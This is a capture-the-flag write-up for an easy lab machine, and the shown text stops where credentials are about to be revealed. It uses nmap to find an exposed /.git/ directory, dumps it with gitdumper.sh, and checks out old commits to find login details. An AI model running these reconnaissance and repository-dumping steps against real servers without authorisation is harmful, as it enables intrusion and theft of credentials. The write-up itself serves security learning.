Difficult: Easy
--------------------------------
Note: Boss wanted me to create a prototype, so here it is! We even used something called "version control" that made deploying this really easy!

RECONNAISSANCE:

+ Scan the machine with NMAP and GOBUSTER (if need):

```bash
nmap -sV -vv -A -p- -T4 <IP>
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.227.124:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-title: Super Awesome Site!
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
```
--> We got the hidden directory "/.git/"

+ We need to research about the vulnerable Git and /.git/ to find the way to exploit them.
+ After researching, we found the tools which we can use them for pwn'ing websites with .git repositories available.
+ Link: "https://github.com/internetwache/GitTools?tab=readme-ov-file"
+ In these tools, we will use tool "Dumper" - This tool can be used to download as much as possible from the found .git repository from webservers which do not have directory listing enabled.

```bash
./gitdumper.sh http://<IP>/.git/ clone

+ We will use "git checkout -- ."

```bash
git checkout -- .
# Copy files from the index to the working tree.
```

--> Check through the files and we got nothing special. So we go deeper than to .git to read these file special like /refs/heads/master, config and packed-refs.

+ Read master or packed-refs, we recieve these hash commit SHA-1 which is the authorâ€™s name and email, the date written, and the commit message.

![alt text](image-4.png)

+ We will checkout the hash SHA-1 checksum and read log:

```bash
git checkout d0b3578a628889f38c0affb1b75457146a4678e5
Note: switching to 'd0b3578a628889f38c0affb1b75457146a4678e5'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at d0b3578 Update .gitlab-ci.yml
```

+ Read log the hash SHA-1:

```bash
git log d0b3578a628889f38c0affb1b75457146a4678e5
```
--> We see a lot of messages commit but we are just notice into the message of boss because in the top note "Boss wanted me to create a prototype..." so we will focus to it.

--> We got the new hash commit so now we are able to checkout it.

+ Read file index.html and we got the username & password of login page:
